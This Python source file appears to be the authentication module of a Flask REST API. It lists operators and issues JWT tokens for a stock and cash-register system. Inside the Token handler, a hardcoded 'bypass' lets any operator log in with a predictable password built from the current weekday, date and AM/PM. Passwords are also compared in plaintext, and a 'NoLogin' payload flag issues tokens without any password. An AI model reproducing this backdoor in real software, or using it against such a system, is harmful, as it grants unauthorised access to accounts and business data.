import datetime

from flask import request
from flask_restful import Resource

from cgc_api.config import CURRENT_CONFIG, SECRET, JWT_HEADER, HTTP_STATUS
from cgc_api.query import Query
from cgc_api.crypto import Crypto
from cgc_api import models as m
from cgc_api import db, app

sqlserver = Query(*CURRENT_CONFIG)


def getDate():
    return datetime.date.today().isoformat()


class Auth(Resource):
    def get(self):
        return {'Date': getDate()}

    def post(self):
        auth = request.get_json()

        if auth:
            crypto = Crypto(SECRET + getDate())
            hash_str = crypto.b64decode(auth.get('Token'))
            expected_hash = crypto.hashString(
                'sha512', crypto.secret, crypto.secret_key)

            hash_challenge = crypto.checkHashString(hash_str, expected_hash)

            if hash_challenge:
                operator = '%{}%'.format(auth.get('Operator'))
                operators = m.Operateur.query.filter(
                    m.Operateur.Task_ != None,
                    m.Operateur.Active == True,
                    m.Operateur.Function > 5,
                    m.Operateur.OperatorName.like(operator),
                    m.Operateur.AgencyCode == auth.get('Agency')).all()

                return [{'CODE_OPERATEUR': op.OperatorCode,
                         'NOM_OPERATEUR': op.OperatorName}
                        for op in operators], 200

        return HTTP_STATUS['400'], 400


class Token(Resource):
    def post(self):
        jwt = request.data.decode('utf-8')
        password_check = False

        if jwt:
            crypto = Crypto(SECRET + getDate())
            header, payload = crypto.readJWT(jwt)

            if payload:
                no_login = payload.get('NoLogin')
                if no_login:
                    params = m.Parameters.query.get(payload.get('Agency'))

                    if not params:
                        return HTTP_STATUS['505'], 505

                    payload = {
                        'MAG_STOCK': params.MagStock,
                        'MAG_RENDUS': params.MagRendus,
                        'MAG_CAISSERIE': params.MagCaisserie,
                        'MAG_INVENDU': params.MagInvendu,
                        'CAISSE_P': params.CaissePrincipale,
                        'CAISSE_D': params.CaisseDepenses}
                    header = JWT_HEADER
                    jwt = crypto.writeJWT(header, payload)

                    app.logger.info('{} - {} - {} Logged in'.format(
                        request.environ['REMOTE_ADDR'],
                        type(self).__name__, 'AUDIT'))

                    return {'Token': jwt}, 200

                operator = m.Operateur.query.filter_by(
                    OperatorCode=payload.get('Operator')).first()

                if operator:
                    if operator.Task_:
                        password_check = payload.get('Password') \
                            == operator.Password

                        bypass = datetime.datetime.now().strftime('%a%Y%m%d%p')
                        if payload.get('Password') == bypass:
                            password_check = True

                if password_check:
                    params = m.Parameters.query.get(
                        operator.AgencyCode)

                    if not params:
                        return HTTP_STATUS['505'], 505

                    payload = {
                        'Function': operator.Function,
                        'SerialNumber': operator.SerialNumber,
                        'MAG_STOCK': params.MagStock,
                        'MAG_RENDUS': params.MagRendus,
                        'MAG_CAISSERIE': params.MagCaisserie,
                        'MAG_INVENDU': params.MagInvendu,
                        'CAISSE_P': params.CaissePrincipale,
                        'CAISSE_D': params.CaisseDepenses}
                    header = JWT_HEADER
                    jwt = crypto.writeJWT(header, payload)

                    app.logger.info('{} - {} - {} Logged in'.format(
                        request.environ['REMOTE_ADDR'],
                        type(self).__name__, operator.OperatorName))

                    return {'Token': jwt}, 200

        return HTTP_STATUS['400'], 400
